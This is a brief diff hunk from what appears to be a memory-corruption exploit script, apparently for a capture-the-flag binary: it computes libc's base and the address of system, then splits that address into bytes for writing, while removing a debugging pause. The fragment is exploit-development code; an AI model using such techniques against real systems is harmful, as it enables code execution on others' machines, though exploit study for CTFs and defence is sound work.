@@ -25,8 +25,6 @@ sys = libc_base + 0x453a0
 print("libc base = {}".format(hex(libc_base)))
 print("sys = {}".format(hex(sys)))
 
-input()
-
 sys_gadget = []
 for i in range(8):
     sys_gadget.append((sys >> 8*i)& 0xff)
